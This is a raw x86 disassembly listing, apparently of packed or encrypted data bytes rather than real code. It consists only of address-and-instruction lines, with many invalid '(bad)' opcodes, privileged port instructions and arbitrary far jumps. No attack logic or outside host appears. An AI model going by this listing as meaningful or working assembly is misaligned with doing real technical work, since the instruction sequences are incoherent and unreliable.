  419ce9:	pop    es
  419cea:	sbb    ebp,edi
  419cec:	stos   DWORD PTR es:[edi],eax
  419ced:	xchg   ebp,eax
  419cee:	adc    ebx,DWORD PTR [eax+0x7a]
  419cf1:	mov    cl,0x4
  419cf3:	ror    dl,0x2
  419cf6:	inc    esp
  419cf7:	call   0xd91d34ad
  419cfc:	adc    DWORD PTR [ebp+0x5dbd62da],0xffffff89
  419d03:	fnstsw WORD PTR [eax-0x3f]
  419d06:	pop    ss
  419d07:	(bad)  
  419d08:	jo     0x419c91
  419d0a:	test   al,0x9
  419d0c:	lds    ecx,FWORD PTR [edi+edi*8-0x4a5caa53]
  419d13:	enter  0xe26e,0x89
  419d17:	mov    edi,0xdab44bc4
  419d1c:	pop    ds
  419d1d:	jne    0x419cfa
  419d1f:	jl     0x419cdf
  419d21:	push   esp
  419d22:	int    0xb4
  419d24:	jge    0x419cce
  419d26:	dec    edx
  419d27:	and    eax,0x91e628b
  419d2c:	jne    0x419cbe
  419d2e:	jmp    0x419da6
  419d30:	(bad)  
  419d31:	js     0x419d2b
  419d33:	xchg   DWORD PTR [eax+eiz*8],esp
  419d36:	add    al,0x91
  419d38:	sub    eax,0xa051053b
  419d3d:	xchg   edx,eax
  419d3e:	out    0xd8,eax
  419d40:	xor    edi,DWORD PTR [ebx+0x49]
  419d43:	add    edi,DWORD PTR [ebx+edi*1+0x60]
  419d47:	in     al,dx
  419d48:	mov    ds:0xd22376bf,al
  419d4d:	fldcw  WORD PTR [ebx+eax*8]
  419d50:	retf   0xb10b
  419d53:	push   0x78
  419d55:	adc    cl,BYTE PTR ds:0x9c56f051
  419d5b:	dec    esp
  419d5c:	fidiv  WORD PTR [ebp-0x3f]
  419d5f:	pop    esi
  419d60:	mov    al,bl
  419d62:	sub    bl,BYTE PTR [esi]
  419d64:	or     BYTE PTR [ecx],al
  419d66:	push   es
  419d67:	std    
  419d68:	push   edx
  419d69:	push   esp
  419d6a:	mov    ss,WORD PTR [ecx+0x3]
  419d6d:	fwait
  419d6e:	sub    DWORD PTR [esi],0x65
  419d71:	into   
  419d72:	inc    ebp
  419d73:	jecxz  0x419dc6
  419d75:	mov    ebx,0x2c9da4fb
  419d7a:	push   0xffffff8e
  419d7c:	daa    
  419d7d:	mov    bh,0x73
  419d7f:	and    DWORD PTR [ebp-0x72642e6f],edx
  419d85:	gs imul eax,esi,0x32
  419d89:	aaa    
  419d8a:	fs push esp
  419d8c:	add    eax,0xbbb7bbe5
  419d91:	f2xm1  
  419d93:	dec    edx
  419d94:	xchg   al,ch
  419d96:	in     al,0x72
  419d98:	repnz xchg edi,edx
  419d9b:	add    eax,0x5048c675
  419da0:	hlt    
  419da1:	sbb    DWORD PTR [edi+0x66],esp
  419da4:	ret    0x88db
  419da7:	pop    ecx
  419da8:	in     al,dx
  419da9:	xor    al,0x93
  419dab:	lea    esi,[esp+eiz*8-0x80]
  419daf:	xchg   DWORD PTR [ebp-0x5b],edi
  419db2:	lods   al,BYTE PTR ds:[esi]
  419db3:	add    BYTE PTR [ebp-0xb],al
  419db6:	ret    0x414b
  419db9:	adc    DWORD PTR [ebx-0x51d98ed9],0x24
  419dc0:	aam    0x4f
  419dc2:	pusha  
  419dc3:	mov    eax,ds:0x8ff52a6
  419dc8:	outs   dx,DWORD PTR ds:[esi]
  419dc9:	cmp    BYTE PTR [ebx],ah
  419dcb:	add    bl,BYTE PTR [edi-0x5355f5bd]
  419dd1:	repnz sub al,0x64
  419dd4:	fmul   QWORD PTR [edi]
  419dd6:	ja     0x419dfa
  419dd8:	dec    esi
  419dd9:	push   esi
  419dda:	into   
  419ddb:	test   BYTE PTR [edx+0x70],bl
  419dde:	sub    eax,DWORD PTR [esi+edx*2-0x6b]
  419de2:	inc    ecx
  419de3:	retf   0x67e9
  419de6:	sub    al,0xf5
  419de8:	pop    ecx
  419de9:	cs loope 0x419d7b
  419dec:	enter  0xcc38,0x21
  419df0:	popa   
  419df1:	cmp    eax,0x1d5a34be
  419df6:	lahf   
  419df7:	and    DWORD PTR [edx-0x52],0x72c9cde9
  419dfe:	adc    al,0x3a
  419e00:	test   eax,0x1645fd20
  419e05:	je     0x419df2
  419e07:	add    BYTE PTR [edi+0x3faa7cb3],0x88
  419e0e:	xlat   BYTE PTR ds:[ebx]
  419e0f:	jne    0x419e64
  419e11:	jnp    0x419db6
  419e13:	icebp  
  419e14:	mov    edi,0x3b9cbaa8
  419e19:	mov    eax,ds:0xc268019b
  419e1e:	stos   DWORD PTR es:[edi],eax
  419e1f:	xor    BYTE PTR [edx+0x51],0x1e
  419e23:	mov    edi,0xd0ddf07
  419e28:	dec    ebx
  419e29:	inc    ebp
  419e2a:	adc    ch,BYTE PTR [eax]
  419e2c:	stos   DWORD PTR es:[edi],eax
  419e2d:	lds    edx,FWORD PTR [esi-0x7bb5143e]
  419e33:	or     al,0x4c
  419e35:	or     DWORD PTR [edx-0x7fc701d5],edi
  419e3b:	add    bh,ah
  419e3d:	das    
  419e3e:	pop    esp
  419e3f:	outs   dx,BYTE PTR ds:[esi]
  419e40:	mov    bx,0x3b4e
  419e44:	out    0x14,al
  419e46:	and    eax,0x26a6bb3b
  419e4b:	mov    ch,0x47
  419e4d:	neg    BYTE PTR [ebp+0x65]
  419e50:	cwde   
  419e51:	out    dx,al
  419e52:	int3   
  419e53:	iret   
  419e54:	iret   
  419e55:	enter  0x6a59,0x56
  419e59:	rcr    DWORD PTR [edi],1
  419e5b:	mov    ds:0x9770189b,eax
  419e60:	jle    0x419e15
  419e62:	retf   
  419e63:	mov    ds:0x1c3b9bfe,al
  419e68:	fdivr  QWORD PTR [ecx+0x2]
  419e6b:	jecxz  0x419ec0
  419e6d:	dec    eax
  419e6e:	or     esi,DWORD PTR [ebp+0x62bb5b82]
  419e74:	imul   edx,ebp,0xffffffc1
  419e77:	loopne 0x419ef4
  419e79:	and    eax,0x582e8928
  419e7e:	or     edi,DWORD PTR [edx]
  419e80:	mov    ebx,esi
  419e82:	mov    BYTE PTR [edx],ch
  419e84:	dec    ebp
  419e85:	les    esp,FWORD PTR [ebx+0x7411d2f]
  419e8b:	jne    0x419e20
  419e8d:	stos   DWORD PTR es:[edi],eax
  419e8e:	in     eax,0x87
  419e90:	pop    ebx
  419e91:	jbe    0x419e98
  419e93:	aam    0x7d
  419e95:	inc    BYTE PTR [ebx+0x70c603b3]
  419e9b:	jmp    0xa746:0x235e625b
  419ea2:	pusha  
  419ea3:	push   ebx
  419ea4:	pop    ecx
  419ea5:	shr    DWORD PTR [esp+eax*1-0x1c],0x1a
  419eaa:	mov    ch,0x2
  419eac:	into   
  419ead:	pop    ebp
  419eae:	push   ebp
  419eaf:	xchg   esp,eax
  419eb0:	pop    esi
  419eb1:	or     BYTE PTR [edx+eiz*1-0x36],ah
  419eb5:	inc    esi
  419eb6:	mov    dh,0x4c
  419eb8:	dec    eax
  419eb9:	fucomip st,st(7)
  419ebb:	iret   
  419ebc:	dec    ecx
  419ebd:	cs pop esp
  419ebf:	test   eax,0x85547858
  419ec4:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ec6:	xlat   BYTE PTR ds:[ebx]
  419ec7:	sbb    DWORD PTR [edx-0x9],eax
  419eca:	add    cl,BYTE PTR [esi]
  419ecc:	push   ss
  419ecd:	and    ebx,DWORD PTR [edx]
  419ecf:	call   0xe241f63a
  419ed4:	pop    edx
  419ed5:	imul   edx,eax,0xa2f11660
  419edb:	inc    edi
  419edc:	fldlg2 
  419ede:	push   esp
  419edf:	sar    DWORD PTR [edx+0x5d],1
  419ee2:	int    0x12
  419ee4:	and    ebp,0x93499a53
  419eea:	push   0x216367dd
  419eef:	in     eax,dx
  419ef0:	fadd   QWORD PTR [eax-0x74734302]
  419ef6:	jbe    0x419f4d
  419ef8:	call   0x1fed:0xefbae50d
  419eff:	or     eax,0x62653b9e
  419f04:	(bad)  
  419f05:	pop    edi
  419f06:	(bad)  
  419f07:	(bad)  [edi+0x43]
  419f0a:	lock popa 
  419f0c:	in     eax,0xb7
  419f0e:	inc    ebp
  419f0f:	xor    eax,0x461d6d24
  419f14:	mov    esi,0x4b98c7c3
  419f19:	inc    eax
  419f1a:	sub    al,0x64
  419f1c:	and    eax,0x7214df2d
  419f21:	push   ebx
  419f22:	push   esp
  419f23:	and    DWORD PTR [esi],0xe54b6b7c
  419f29:	ds (bad) 
  419f2b:	dec    ebx
  419f2c:	or     BYTE PTR [ebp+0x31],cl
  419f2f:	ficomp DWORD PTR [edx-0x13]
  419f32:	or     ch,bh
  419f34:	lods   eax,DWORD PTR ds:[esi]
  419f35:	add    bl,BYTE PTR [edx-0x53d9a827]
  419f3b:	mov    bl,0x23
  419f3d:	mov    esp,0xd0662a71
  419f42:	call   0xf9ab:0xf3ec3cdd
  419f49:	icebp  
  419f4a:	mov    bh,BYTE PTR [ebx]
  419f4c:	pop    ebx
  419f4d:	adc    esp,ecx
  419f4f:	sub    dl,0x52
  419f52:	pusha  
  419f53:	xchg   esi,eax
  419f54:	or     edi,DWORD PTR [ecx+esi*2+0x468bfe1f]
  419f5b:	int    0x8f
  419f5d:	adc    eax,0x375b99c
  419f62:	jle    0x419f91
  419f64:	push   esi
  419f65:	mov    ecx,?
  419f67:	pop    ebx
  419f68:	loopne 0x419fc1
  419f6a:	jns    0x419eed
  419f6c:	hlt    
  419f6d:	rcr    BYTE PTR [ebp+0x6c321171],cl
  419f73:	push   esi
  419f74:	push   ss
  419f75:	jle    0x419fc8
  419f77:	scas   eax,DWORD PTR es:[edi]
  419f78:	rol    BYTE PTR ds:[ecx],1
  419f7b:	std    
  419f7c:	mov    al,ds:0xc7147942
  419f81:	and    eax,0xcc28432e
  419f86:	jno    0x419fa8
  419f88:	cdq    
  419f89:	or     bl,BYTE PTR [ecx+0x325daf4]
  419f8f:	sub    eax,0x15c5941b
  419f94:	nop
  419f95:	cmp    BYTE PTR [edx+0x61],al
  419f98:	mov    edi,0x5c227886
  419f9d:	fbstp  TBYTE PTR [edx+eax*4+0x55]
  419fa1:	lds    esi,FWORD PTR [esi+0x27]
  419fa4:	daa    
  419fa5:	je     0x41a022
  419fa7:	and    BYTE PTR [esi-0x20],0x63
  419fab:	mov    dl,0x6b
  419fad:	cmp    al,0x71
  419faf:	mov    ah,0xa
  419fb1:	mov    dh,0xf2
  419fb3:	jns    0x419f87
  419fb5:	mov    ch,0xbd
  419fb7:	shl    DWORD PTR [edi-0x3b],cl
  419fba:	cwde   
  419fbb:	outs   dx,DWORD PTR ds:[esi]
  419fbc:	daa    
  419fbd:	and    ebx,DWORD PTR [esi-0x5035f1fd]
  419fc3:	mov    bl,BYTE PTR [ecx]
  419fc5:	push   edx
  419fc6:	and    ebp,0xfffffff4
  419fc9:	sub    bl,BYTE PTR [edx-0x2d]
  419fcc:	dec    edi
  419fcd:	push   ebx
  419fce:	push   esi
  419fcf:	shl    esi,cl
  419fd1:	sbb    dl,cl
  419fd3:	mov    eax,ds:0x21410de
  419fd8:	retf   0x1c73
  419fdb:	in     al,dx
  419fdc:	mov    DWORD PTR ds:0xe19a16f2,ecx
  419fe2:	xchg   ebp,eax
  419fe3:	in     ax,0xea
  419fe6:	lods   eax,DWORD PTR ds:[esi]
  419fe7:	xlat   BYTE PTR ds:[ebx]
  419fe8:	mov    ch,BYTE PTR [edx]
  419fea:	popa   
  419feb:	retf   0xac3f
  419fee:	xchg   edx,eax
  419fef:	ins    DWORD PTR es:[edi],dx
  419ff0:	jmp    0x2b269f1a
  419ff5:	mov    ds:0x90d88d13,al
  419ffa:	or     edx,DWORD PTR gs:[ebp+0x7e5c6c11]
  41a001:	push   ecx
  41a002:	push   ebx
  41a003:	mov    al,0x8b
  41a005:	(bad)  
  41a006:	ror    ecx,cl
  41a008:	retf   
  41a009:	int3   
  41a00a:	mov    dl,0x3f
  41a00c:	or     al,0xd1
  41a00e:	test   eax,0x3ba24ff8
  41a013:	cmp    eax,0x6c6b33ca
  41a018:	sub    bl,BYTE PTR [esi+0x19]
  41a01b:	gs stos BYTE PTR es:[edi],al
  41a01d:	xsha256 (bad)
  41a01e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a01f:	push   edx
  41a020:	mov    WORD PTR [ecx],fs
  41a022:	aas    
  41a023:	or     eax,DWORD PTR [edi+0xaed51c3]
  41a029:	adc    al,0xcb
  41a02b:	dec    ebx
  41a02c:	ror    DWORD PTR [esi+esi*4-0x50],1
  41a030:	fdiv   DWORD PTR [eax]
  41a032:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a033:	mov    cl,0x46
  41a035:	rol    dl,cl
  41a037:	push   0x3e329959
  41a03c:	xchg   ebp,eax
  41a03d:	xor    eax,0xe16c9810
  41a042:	inc    ecx
  41a043:	aas    
  41a044:	fnstenv [edi]
  41a046:	mul    BYTE PTR [ebx-0x53]
  41a049:	retf   
  41a04a:	cmp    eax,0xe9f32c8c
  41a04f:	inc    esi
  41a050:	cli    
  41a051:	push   ds
  41a052:	aas    
  41a053:	mov    ?,WORD PTR [ebx-0xe63b6a2]
  41a059:	shl    DWORD PTR [edi*1+0x1997b83e],0x89
  41a061:	ins    DWORD PTR es:[edi],dx
  41a062:	enter  0xd634,0x60
  41a066:	std    
  41a067:	xchg   esi,eax
  41a068:	xor    ch,BYTE PTR [edi+edx*4-0x25]
  41a06c:	test   BYTE PTR [ebx],ah
  41a06e:	pop    ecx
  41a06f:	ret    
  41a070:	ret    0x5fa1
  41a073:	sbb    bl,BYTE PTR [ecx]
  41a075:	cmc    
  41a076:	jmp    0x41a022
  41a078:	pop    esi
  41a079:	mov    WORD PTR [ecx-0x585b55b0],es
  41a07f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a080:	xor    DWORD PTR [esi-0x30],ecx
  41a083:	add    al,0x5a
  41a085:	enter  0x6e98,0xb
  41a089:	fwait
  41a08a:	or     esi,DWORD PTR [esi]
  41a08c:	xor    DWORD PTR [esi-0x3a],eax
  41a08f:	mov    ah,0x78
  41a091:	push   eax
  41a092:	lods   eax,DWORD PTR ds:[esi]
  41a093:	addr16 push ds
  41a095:	sbb    BYTE PTR [edi-0x54],dh
  41a098:	scas   al,BYTE PTR es:[edi]
  41a099:	retf   0x4b4
  41a09c:	std    
  41a09d:	mov    ch,0x3c
  41a09f:	xor    al,0xe0
  41a0a1:	mov    BYTE PTR [esi+edx*8-0x2023f947],dh
  41a0a8:	jecxz  0x41a126
  41a0aa:	jae    0x41a061
  41a0ac:	stc    
  41a0ad:	adc    BYTE PTR [ecx],ah
  41a0af:	xchg   ebx,eax
  41a0b0:	ja     0x41a07f
  41a0b2:	mov    dl,BYTE PTR [eax-0x56]
  41a0b5:	out    dx,eax
  41a0b6:	addr16 adc al,0x38
  41a0b9:	xchg   edi,eax
  41a0ba:	adc    eax,0x16ef2c78
  41a0bf:	push   DWORD PTR [esi]
  41a0c1:	push   DWORD PTR [edi+ebp*4+0x79fe72bc]
  41a0c8:	fisub  WORD PTR ds:0x34071171
  41a0ce:	mul    eax
  41a0d0:	ins    BYTE PTR es:[edi],dx
  41a0d1:	dec    eax
  41a0d2:	clc    
  41a0d3:	iret   
  41a0d4:	sar    DWORD PTR [ebx+0x1ceb9a59],1
  41a0da:	int    0xb3
  41a0dc:	pop    es
  41a0dd:	or     DWORD PTR [edx+0x4ef95347],edi
  41a0e3:	dec    esi
  41a0e4:	push   DWORD PTR ds:0x9da7e850
  41a0ea:	lea    edx,[ebx]
  41a0ec:	sti    
  41a0ed:	adc    al,0x52
  41a0ef:	xchg   edi,eax
  41a0f0:	les    edx,FWORD PTR [edi-0x3cdeb0e2]
  41a0f6:	pop    eax
  41a0f7:	pop    ebx
  41a0f8:	jmp    0x41a0f2
  41a0fa:	dec    edx
  41a0fb:	inc    ecx
  41a0fc:	and    DWORD PTR [esi+0x74a16906],0x4c
  41a103:	imul   edx,ecx,0xffffff93
  41a106:	mov    edx,0x79affd59
  41a10b:	pop    ebp
  41a10c:	mov    ah,0x8f
  41a10e:	in     al,dx
  41a10f:	dec    edx
  41a110:	mov    ebx,0x8c485e56
  41a115:	jmp    0x735de6b5
  41a11a:	sub    DWORD PTR [eax],0x7c9e4185
  41a120:	lock in eax,dx
  41a122:	pop    esi
  41a123:	push   ebx
  41a124:	ret    0xf6ae
  41a127:	stos   BYTE PTR es:[edi],al
  41a128:	mov    cl,0xa
  41a12a:	inc    ebp
  41a12b:	jns    0x41a16d
  41a12d:	xor    ch,BYTE PTR [esi+0x1a]
  41a130:	repz dec esp
  41a132:	scas   eax,DWORD PTR es:[edi]
  41a133:	ss jl  0x41a10d
  41a136:	jo     0x41a10a
  41a138:	sbb    eax,esp
  41a13a:	push   esp
  41a13b:	push   ebx
  41a13c:	add    ebx,edi
  41a13e:	adc    BYTE PTR [edi],bh
  41a140:	je     0x41a0d8
  41a142:	dec    ebx
  41a143:	inc    ebp
  41a144:	xor    ah,dl
  41a146:	jae    0x41a1b4
  41a148:	sbb    eax,0x2aad7c05
  41a14d:	and    al,0x71
  41a14f:	out    dx,eax
  41a150:	mov    bh,0x3f
  41a152:	lods   al,BYTE PTR ds:[esi]
  41a153:	sahf   
  41a154:	das    
  41a155:	push   ecx
  41a156:	add    BYTE PTR [edx],al
  41a158:	jne    0x41a140
  41a15a:	and    dl,BYTE PTR [edx+0xc299bde]
  41a160:	mov    ch,0x32
  41a162:	lahf   
  41a163:	xchg   edi,eax
  41a164:	cld    
  41a165:	mov    ch,0x19
  41a167:	or     al,0x19
  41a169:	or     eax,0x88c2158d
  41a16e:	les    edi,FWORD PTR [esi-0x762bd35c]
  41a174:	(bad)  
  41a175:	xor    esp,DWORD PTR [edi-0x1b94efee]
  41a17b:	cwde   
  41a17c:	mov    ecx,?
  41a17e:	test   al,0xa4
  41a180:	mov    WORD PTR [ecx],es
  41a182:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a183:	ins    DWORD PTR es:[edi],dx
  41a184:	in     eax,dx
  41a185:	sub    edi,0x88dfb3bd
  41a18b:	out    0x79,eax
  41a18d:	das    
  41a18e:	into   
  41a18f:	je     0x41a1b9
  41a191:	sbb    BYTE PTR [edx-0x7],0xed
  41a195:	jle    0x41a213
  41a197:	fs push ebp
  41a199:	inc    ebx
  41a19a:	mov    ebx,0x424b5b9d
  41a19f:	dec    eax
  41a1a0:	pop    esp
  41a1a1:	sbb    BYTE PTR [esi+0x41],dl
  41a1a4:	iret   
  41a1a5:	out    dx,al
  41a1a6:	pop    eax
  41a1a7:	imul   edi,esi,0xe5e097da
  41a1ad:	mov    esp,0xea3c5770
  41a1b2:	adc    al,0x2e
  41a1b4:	inc    edi
  41a1b5:	stos   DWORD PTR es:[edi],eax
  41a1b6:	sub    eax,0x8d4eba85
  41a1bb:	mov    ch,0x5
  41a1bd:	mov    edi,0x17fd16b
  41a1c2:	es inc edx
  41a1c4:	rcl    al,cl
  41a1c6:	stos   BYTE PTR es:[edi],al
  41a1c7:	sti    
  41a1c8:	icebp  
  41a1c9:	pusha  
  41a1ca:	int3   
  41a1cb:	in     eax,0x59
  41a1cd:	scas   eax,DWORD PTR es:[edi]
  41a1ce:	shl    ebp,0x41
  41a1d1:	mov    dl,0xfb
  41a1d3:	imul   edx,DWORD PTR [esi+0x7d],0x928f3a68
  41a1da:	xor    ch,BYTE PTR [ebp*4-0x4f35f6]
  41a1e1:	(bad)  
  41a1e3:	and    ebx,ebx
  41a1e5:	aad    0xe8
  41a1e7:	out    0xe9,al
  41a1e9:	(bad)  
  41a1ea:	inc    eax
  41a1eb:	inc    BYTE PTR [edi]
  41a1ed:	ror    bh,1
  41a1ef:	lock xor BYTE PTR [ecx],ah
  41a1f2:	jmp    0x41a218
  41a1f4:	sbb    cl,BYTE PTR [edx+0x9]
  41a1f7:	int    0xed
  41a1f9:	test   eax,0x5752fd08
  41a1fe:	add    DWORD PTR [ecx],esi
  41a200:	bound  ecx,QWORD PTR [edi+ecx*8]
  41a203:	cmc    
  41a204:	icebp  
  41a205:	je     0x41a1cd
  41a207:	or     ch,bh
  41a209:	test   DWORD PTR [esp+edx*2],ebx
  41a20c:	sbb    BYTE PTR [edi-0x2d54e7a0],ah
  41a212:	push   ds
  41a213:	mov    al,0x13
  41a215:	sub    bl,BYTE PTR [edx+0x302af0c]
  41a21b:	test   BYTE PTR [edx],bh
  41a21d:	cmp    al,0x5d
  41a21f:	out    dx,al
  41a220:	pop    es
  41a221:	or     DWORD PTR [esi+ecx*8-0x75dc5fd7],0xfffffff7
  41a229:	sub    bh,ch
  41a22b:	and    edx,esp
  41a22d:	out    0x6,eax
  41a22f:	mov    al,0x5e
  41a231:	mov    ds:0x4ecf32e3,al
  41a236:	mov    bl,0x3b
  41a238:	test   al,0x23
  41a23a:	gs popa 
  41a23c:	popa   
  41a23d:	mov    al,ds:0xfd692701
  41a242:	jbe    0x41a1e3
  41a244:	and    al,0x12
  41a246:	xchg   ebp,eax
  41a247:	dec    ebx
  41a248:	push   edx
  41a249:	jle    0x41a27c
  41a24b:	xchg   esi,eax
  41a24c:	leave  
  41a24d:	sub    DWORD PTR [ebx+ebp*4-0x41],edx
  41a251:	jns    0x41a1f1
  41a253:	and    DWORD PTR [edi],ebx
  41a255:	clc    
  41a256:	push   0x16
  41a258:	idiv   dh
  41a25a:	ret    0xfae1
  41a25d:	pusha  
  41a25e:	pop    esi
  41a25f:	push   ss
  41a260:	push   0x4ad68254
  41a265:	sub    eax,0x60255fd8
  41a26a:	sub    DWORD PTR [edi],eax
  41a26c:	pop    esp
  41a26d:	fisttp WORD PTR [ebx]
  41a26f:	pushf  
  41a270:	and    DWORD PTR [ebp+eiz*2-0x568c51c7],ebx
  41a277:	or     al,0x63
  41a279:	pop    es
  41a27a:	xchg   esi,eax
  41a27b:	sub    edx,DWORD PTR [eax-0x61]
  41a27e:	pop    edx
  41a27f:	(bad)  
  41a280:	stos   DWORD PTR es:[edi],eax
  41a281:	xlat   BYTE PTR ds:[ebx]
  41a282:	push   edx
  41a283:	fistp  QWORD PTR [edx]
  41a285:	add    al,0x3e
  41a287:	adc    ecx,DWORD PTR [ebp+0x129df960]
  41a28d:	jns    0x41a302
  41a28f:	mov    ebp,0xd61f7889
  41a294:	adc    al,0xcf
  41a296:	xchg   ebp,eax
  41a297:	jns    0x41a22a
  41a299:	mov    edx,0xa1704252
  41a29e:	sbb    DWORD PTR [eax-0x33f9ca96],ecx
  41a2a4:	in     al,0x78
  41a2a6:	adc    dl,bl
  41a2a8:	pop    ss
  41a2a9:	bound  edx,QWORD PTR cs:[esi-0x7c]
  41a2ad:	mov    esp,DWORD PTR [ebp-0x41]
  41a2b0:	popf   
  41a2b1:	and    esp,ebp
  41a2b3:	mov    ds:0xcce6377d,al
  41a2b8:	mov    cl,0x88
  41a2ba:	mov    ch,0x2f
  41a2bc:	push   esp
  41a2bd:	gs nop
  41a2bf:	outs   dx,BYTE PTR ds:[esi]
  41a2c0:	jecxz  0x41a2bc
  41a2c2:	and    edx,ecx
  41a2c4:	pop    edi
  41a2c5:	iret   
  41a2c6:	(bad)  
  41a2c7:	(bad)  
  41a2c8:	mov    eax,0x6894384d
  41a2cd:	add    ebp,DWORD PTR [ecx+ebx*4-0x4c0bab21]
  41a2d4:	dec    esp
  41a2d5:	ins    BYTE PTR es:[edi],dx
  41a2d6:	mov    WORD PTR [ebx-0x245507fb],cs
  41a2dc:	popf   
  41a2dd:	inc    ebx
  41a2de:	std    
  41a2df:	push   0x8bc37a12
  41a2e4:	sub    eax,DWORD PTR fs:[eax-0x31]
  41a2e8:	xor    al,0x14
  41a2ea:	xchg   esi,eax
  41a2eb:	push   es
  41a2ec:	loope  0x41a34d
  41a2ee:	adc    al,BYTE PTR [ecx+0x689fa640]
  41a2f4:	in     eax,0x30
  41a2f6:	sub    eax,esp
  41a2f8:	ret    0xb888
  41a2fb:	jl     0x41a2f1
  41a2fd:	sbb    esp,eax
  41a2ff:	mov    bh,0x19
  41a301:	push   cs
  41a302:	push   edx
  41a303:	lods   al,BYTE PTR ds:[esi]
  41a304:	xchg   dl,bl
  41a306:	mov    ecx,0x76e65ada
  41a30b:	fcomp  DWORD PTR [edi+ebx*2+0x68c1efdf]
  41a312:	mov    dl,0x39
  41a314:	aad    0xd5
  41a316:	ss cmp al,0x90
  41a319:	data16 jbe 0x41a2ad
  41a31c:	cs daa 
  41a31e:	push   ebx
  41a31f:	fdivr  st(7),st
  41a321:	jl     0x41a37b
  41a323:	xor    eax,0x88fdfd5f
  41a328:	dec    edx
  41a329:	iret   
  41a32a:	pop    esi
  41a32b:	inc    BYTE PTR [esi+0x21]
  41a32e:	stos   BYTE PTR es:[edi],al
  41a32f:	xlat   BYTE PTR ds:[ebx]
  41a330:	cmp    ebp,DWORD PTR [edx+0x1b331006]
  41a336:	in     eax,0x76
  41a338:	popf   
  41a339:	outs   dx,BYTE PTR ds:[esi]
  41a33a:	push   ebp
  41a33b:	mov    bl,BYTE PTR [eax-0x614a9e0e]
  41a341:	shr    BYTE PTR [ebx-0x4],cl
  41a344:	mov    al,ds:0xee2cd15f
  41a349:	out    0x38,al
  41a34b:	mov    edx,0x1e38f180
  41a350:	repz push 0x11
  41a353:	adc    dh,BYTE PTR [eax+0x2d]
  41a356:	(bad)  [ebx+0x42]
  41a359:	lock jmp 0x564f:0x970223f6
  41a361:	xor    al,0x2
  41a363:	inc    esp
  41a364:	cld    
  41a365:	sub    al,0xcf
  41a367:	xor    DWORD PTR [edx-0x76bf992d],ebx
  41a36d:	jmp    0x9c66b53a
  41a372:	mov    ecx,0x45ce537
  41a377:	push   0xffffffe6
  41a379:	pop    eax
  41a37a:	add    BYTE PTR [ecx-0x28],bh
  41a37d:	stos   DWORD PTR es:[edi],eax
  41a37e:	addr16 std 
  41a380:	jmp    0x7b06712e
  41a385:	fldcw  WORD PTR [edi-0x7c]
  41a388:	test   BYTE PTR [eax+eiz*1-0x50],0x16
  41a38d:	adc    esi,DWORD PTR [eax+0x2f]
  41a390:	sbb    bl,BYTE PTR [ecx+0x7e]
  41a393:	jnp    0x41a355
  41a395:	mov    dl,0x97
  41a397:	jo     0x41a35c
  41a399:	retf   
  41a39a:	es and DWORD PTR cs:[ecx+0x59],ecx
  41a39f:	mov    eax,ds:0x86eb4d56
  41a3a4:	mov    ah,0xc9
  41a3a6:	call   0x75df:0x2768bcb9
  41a3ad:	into   
  41a3ae:	mov    BYTE PTR [ebx+0x333934dd],al
  41a3b4:	pop    eax
  41a3b5:	(bad)  
  41a3b6:	cmp    ebx,DWORD PTR [ecx-0x7d]
  41a3b9:	cmp    BYTE PTR [edi],0xa5
  41a3bc:	scas   eax,DWORD PTR es:[edi]
  41a3bd:	pop    ebx
  41a3be:	fsub   QWORD PTR [esi+0xee46bcc]
  41a3c4:	pop    edx
  41a3c5:	cmp    DWORD PTR [edx],esp
  41a3c7:	dec    ebx
  41a3c8:	popa   
  41a3c9:	sbb    esi,DWORD PTR [ebx]
  41a3cb:	adc    BYTE PTR [edx+0x6c6eec2b],0xc9
  41a3d2:	popa   
  41a3d3:	sbb    edx,ebp
  41a3d5:	sar    DWORD PTR [edi],0xac
  41a3d8:	mov    ds:0xfb332f52,al
  41a3dd:	mov    esp,0x4bdb7d7d
  41a3e2:	add    dl,ah
  41a3e4:	mov    al,ds:0x3d1357d2
  41a3e9:	mov    esi,0xfe086e57
  41a3ee:	pop    edx
  41a3ef:	call   0xe2123ef6
  41a3f4:	add    al,0xf8
  41a3f6:	cld    
  41a3f7:	mov    ?,WORD PTR [esi+0x543c1b70]
  41a3fd:	jg     0x41a3e4
  41a3ff:	sub    edx,esp
  41a401:	mov    edx,0xd2057283
  41a406:	test   al,0xc7
  41a408:	scas   al,BYTE PTR es:[edi]
  41a409:	js     0x41a3da
  41a40b:	fcmovnbe st,st(5)
  41a40d:	aam    0xea
  41a40f:	inc    edi
  41a410:	sbb    dh,bh
  41a412:	mov    eax,0x525ee1bc
  41a417:	out    dx,eax
  41a418:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a419:	pusha  
  41a41a:	cmp    eax,0x9fa86d8
  41a41f:	iret   
  41a420:	ins    DWORD PTR es:[edi],dx
  41a421:	(bad)  
  41a422:	jmp    0x41a423
  41a424:	jbe    0x41a473
  41a426:	add    DWORD PTR [ecx+eax*1+0x61],ebp
  41a42a:	pop    edx
  41a42b:	out    0x6f,al
  41a42d:	les    eax,FWORD PTR [edi-0x31]
  41a430:	push   es
  41a431:	pop    ds
  41a432:	dec    esp
  41a433:	out    0x9b,al
  41a435:	adc    al,BYTE PTR ds:0x7ee92f7e
  41a43b:	mov    ds:0x5b294c88,al
  41a440:	sbb    eax,0x8a02334e
  41a445:	into   
  41a446:	idiv   DWORD PTR [esp+ebp*8-0x7cad6f84]
  41a44d:	xchg   esp,eax
  41a44e:	ins    DWORD PTR es:[edi],dx
  41a44f:	out    dx,al
  41a450:	push   0x52
  41a452:	clc    
  41a453:	scas   al,BYTE PTR es:[edi]
  41a454:	xor    eax,ebx
  41a456:	push   ebp
  41a457:	xchg   BYTE PTR [ecx+0x75],ah
  41a45a:	rcr    DWORD PTR [edi-0x1e617ef3],1
  41a460:	mov    esp,0xf119fe03
  41a465:	xor    al,0x6d
  41a467:	pop    ds
  41a468:	sti    
  41a469:	std    
  41a46a:	add    BYTE PTR [ebx],bh
  41a46c:	or     BYTE PTR [edi+0x61eb3dbd],ch
  41a472:	xchg   ebx,eax
  41a473:	push   ds
  41a474:	sar    ebx,1
  41a476:	sahf   
  41a477:	nop
  41a478:	adc    BYTE PTR [ebp+0x3c],bh
  41a47b:	fistp  QWORD PTR [edi-0x18cfa6d8]
  41a481:	or     esi,ebx
  41a483:	xchg   ebp,eax
